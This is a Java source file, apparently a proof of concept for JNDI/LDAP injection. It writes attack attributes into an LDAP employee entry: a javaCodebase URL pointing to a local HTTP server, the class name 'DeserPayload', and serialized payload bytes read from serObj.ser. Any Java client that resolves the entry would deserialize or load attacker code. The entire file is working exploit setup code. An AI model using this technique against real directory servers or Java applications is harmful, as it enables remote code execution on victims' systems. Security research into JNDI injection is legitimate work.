package com.longofo;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.BasicAttribute;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import javax.naming.directory.ModificationItem;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Hashtable;

public class LDAPServer1 {
    public static void main(String[] args) throws NamingException, IOException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

        DirContext ctx = new InitialDirContext(env);


        String javaCodebase = "http://127.0.0.1:8000/";


        byte[] javaSerializedData = Files.readAllBytes(new File("serObj.ser").toPath());

        BasicAttribute mod1 = new
                BasicAttribute("javaCodebase", javaCodebase);
        BasicAttribute mod2 = new
                BasicAttribute("javaClassName", "DeserPayload");
        BasicAttribute mod3 = new BasicAttribute("javaSerializedData",
                javaSerializedData);
        ModificationItem[] mods = new ModificationItem[3];
        mods[0] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1);
        mods[1] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2);
        mods[2] = new ModificationItem(DirContext.ADD_ATTRIBUTE, mod3);
        ctx.modifyAttributes("uid=longofo,ou=employees,dc=example,dc=com", mods);
    }
}
